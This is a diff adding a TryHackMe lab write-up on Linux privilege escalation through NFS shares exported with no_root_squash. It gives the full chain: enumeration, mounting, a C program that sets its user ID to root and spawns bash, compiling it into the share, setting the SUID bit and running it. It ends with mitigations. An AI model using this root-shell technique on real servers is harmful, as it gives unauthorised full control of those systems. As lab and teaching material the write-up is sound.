@@ -1471,5 +1471,489 @@ Because the vulnerable application runs with elevated privileges, the malicious 
 
 ---
 
+# TryHackMe - Linux Privilege Escalation
+# NFS (Network File System) Privilege Escalation
 
+## Room
+
+**TryHackMe – Linux Privilege Escalation**
+
+---
+
+# Objective
+
+Exploit a misconfigured **NFS (Network File System)** share configured with the **no_root_squash** option to obtain **root privileges** on the target machine.
+
+---
+
+# Overview
+
+Network File System (NFS) is a protocol that allows Linux systems to share directories across a network.
+
+Administrators commonly use NFS to share files between multiple servers. However, insecure configurations can introduce serious privilege escalation vulnerabilities.
+
+One of the most dangerous configuration options is **no_root_squash**.
+
+When enabled, the root user on a remote client retains root privileges on the exported share, allowing attackers to create **SUID** binaries that execute as root on the target system.
+
+---
+
+# Understanding NFS
+
+NFS allows directories from one Linux machine to be mounted and accessed by another machine over the network.
+
+Exported directories are configured inside:
+
+```text
+/etc/exports
+```
+
+Example:
+
+```text
+/home/shared *(rw,sync)
+```
+
+Clients can then mount this directory and interact with it as if it were stored locally.
+
+---
+
+# Root Squash vs No Root Squash
+
+By default, NFS protects the server using a feature called **root_squash**.
+
+### With `root_squash`
+
+```text
+Remote Root User
+        │
+        ▼
+NFS Server
+        │
+        ▼
+Mapped to "nfsnobody"
+        │
+        ▼
+Limited privileges
+```
+
+Even if the attacker is root on their own machine, the NFS server maps them to an unprivileged account.
+
+---
+
+### With `no_root_squash`
+
+```text
+Remote Root User
+        │
+        ▼
+NFS Server
+        │
+        ▼
+Still Root
+        │
+        ▼
+Can create root-owned files
+Can preserve SUID permissions
+```
+
+This completely removes NFS's primary security protection and allows privilege escalation.
+
+---
+
+# Enumeration
+
+## Step 1 – Enumerate Exported Shares
+
+From my Kali machine, I identified the exported NFS shares.
+
+```bash
+showmount -e 10.48.190.45
+```
+
+Example output:
+
+```text
+Export list for 10.48.190.45
+
+/home/ubuntu/sharedfolder
+/tmp
+/home/backup
+```
+
+### Room Question
+
+**How many mountable shares can you identify?**
+
+Answer:
+
+```text
+3
+```
+
+---
+
+## Step 2 – Verify NFS Configuration
+
+On the target machine, I inspected the export configuration.
+
+```bash
+cat /etc/exports
+```
+
+Output:
+
+```text
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+Every exported share was configured with:
+
+```text
+no_root_squash
+```
+
+### Room Question
+
+**How many shares have the no_root_squash option enabled?**
+
+Answer:
+
+```text
+3
+```
+
+This confirmed that the exported directories were vulnerable to privilege escalation.
+
+---
+
+# Why This Configuration Is Dangerous
+
+Normally, when files are created from an NFS client as root, the server changes the ownership to an unprivileged user.
+
+With **no_root_squash**, this protection is disabled.
+
+As a result:
+
+- Files remain owned by root.
+- Root ownership is preserved.
+- SUID permissions are preserved.
+- Executables created remotely can execute with root privileges on the server.
+
+---
+
+# Exploitation
+
+## Step 1 – Create a Mount Point
+
+On my Kali machine, I created a directory for mounting the vulnerable share.
+
+```bash
+sudo mkdir -p /mnt/nfs
+```
+
+---
+
+## Step 2 – Mount the Vulnerable Share
+
+I mounted the exported `/tmp` directory.
+
+```bash
+sudo mount 10.48.190.45:/tmp /mnt/nfs
+```
+
+Verified the mount.
+
+```bash
+mount | grep /mnt/nfs
+```
+
+Once mounted, the remote directory behaved like a local folder.
+
+---
+
+## Step 3 – Create the Exploit Program
+
+I created a simple C program that spawns a root shell.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main()
+{
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+
+Saved as:
+
+```text
+nfs.c
+```
+
+### Why this works
+
+The program explicitly changes both the user ID and group ID to **0** (root) before launching a Bash shell.
+
+If executed through a SUID binary owned by root, the shell inherits root privileges.
+
+---
+
+## Step 4 – Compile the Binary
+
+I compiled the exploit directly into the mounted NFS share.
+
+```bash
+sudo gcc nfs.c -o /mnt/nfs/nfs
+```
+
+Since the share was mounted remotely, the compiled binary was written directly onto the target machine.
+
+---
+
+## Step 5 – Apply the SUID Bit
+
+Next, I assigned the SUID permission.
+
+```bash
+sudo chmod 4755 /mnt/nfs/nfs
+```
+
+Verify:
+
+```bash
+ls -l /mnt/nfs/nfs
+```
+
+Output:
+
+```text
+-rwsr-xr-x 1 root root ...
+```
+
+The **s** indicates that the SUID permission was successfully preserved because of the **no_root_squash** configuration.
+
+---
+
+## Step 6 – Execute the Binary
+
+On the target machine:
+
+```bash
+/tmp/nfs
+```
+
+The binary executed with **root privileges**.
+
+Verify:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Display user information.
+
+```bash
+id
+```
+
+Output:
+
+```text
+uid=0(root)
+gid=0(root)
+```
+
+Root privileges were successfully obtained.
+
+---
+
+# Capture the Flag
+
+Locate the flag.
+
+```bash
+find / -name flag7.txt 2>/dev/null
+```
+
+Read the flag.
+
+```bash
+cat /path/to/flag7.txt
+```
+
+---
+
+# Why the Exploit Worked
+
+The exported directory allowed remote root users to retain their root privileges because **no_root_squash** was enabled.
+
+This allowed me to:
+
+1. Mount the exported directory.
+2. Compile a binary directly into the mounted share.
+3. Preserve root ownership.
+4. Preserve the SUID permission.
+5. Execute the binary locally on the target.
+6. Obtain a root shell.
+
+Without **no_root_squash**, the binary would have been owned by **nfsnobody**, making the attack impossible.
+
+---
+
+# Pentester Methodology
+
+Whenever I encounter NFS during an assessment, I follow this workflow:
+
+### 1. Enumerate exported shares
+
+```bash
+showmount -e <target-ip>
+```
+
+### 2. Identify insecure exports
+
+Look for:
+
+```text
+no_root_squash
+```
+
+inside:
+
+```text
+/etc/exports
+```
+
+### 3. Mount the vulnerable share
+
+```bash
+sudo mount <target>:/share /mnt/nfs
+```
+
+### 4. Create a privilege escalation binary
+
+Compile it directly into the mounted directory.
+
+### 5. Apply the SUID bit
+
+```bash
+chmod 4755 binary
+```
+
+### 6. Execute the binary on the target
+
+### 7. Verify root privileges
+
+---
+
+# Commands Used
+
+```bash
+# Enumerate exported NFS shares
+showmount -e 10.48.190.45
+
+# View NFS configuration (target)
+cat /etc/exports
+
+# Create mount point
+sudo mkdir -p /mnt/nfs
+
+# Mount vulnerable share
+sudo mount 10.48.190.45:/tmp /mnt/nfs
+
+# Verify mount
+mount | grep /mnt/nfs
+
+# Compile exploit
+sudo gcc nfs.c -o /mnt/nfs/nfs
+
+# Apply SUID permissions
+sudo chmod 4755 /mnt/nfs/nfs
+
+# Verify permissions
+ls -l /mnt/nfs/nfs
+
+# Execute exploit
+/tmp/nfs
+
+# Verify privileges
+whoami
+id
+
+# Locate the flag
+find / -name flag7.txt 2>/dev/null
+
+# Read the flag
+cat /path/to/flag7.txt
+```
+
+---
+
+# Key Concepts Learned
+
+- Network File System (NFS)
+- `/etc/exports`
+- Exported share enumeration
+- `showmount`
+- `root_squash`
+- `no_root_squash`
+- SUID permissions
+- Remote privilege escalation
+- Shared filesystem security
+- Root privilege inheritance
+
+---
+
+# Security Impact
+
+The **no_root_squash** option disables one of NFS's most important security protections.
+
+An attacker with root access on a client machine can:
+
+- Create root-owned files.
+- Preserve SUID permissions.
+- Execute binaries as root.
+- Gain complete control of the NFS server.
+
+A single insecure export can therefore result in full system compromise.
+
+---
+
+# Mitigation
+
+- Keep the default **root_squash** option enabled.
+- Never enable **no_root_squash** unless absolutely necessary.
+- Restrict NFS exports to trusted hosts.
+- Export directories as read-only whenever possible.
+- Monitor exported shares for unauthorized SUID files.
+- Regularly audit `/etc/exports` for insecure configurations.
+- Apply the principle of least privilege when configuring network file shares.
+
+---
+
+# Lab Note
+
+While completing this lab, I encountered a **GLIBC version mismatch** because my Kali Linux system was newer than the target machine.
+
+The exploit binary compiled on Kali required a newer version of **glibc** than the target system provided.
+
+This compatibility issue affected the compiled executable but **did not affect the NFS privilege escalation technique itself**. Recompiling the binary on a compatible system or statically linking it resolves the issue.
+
+---
 
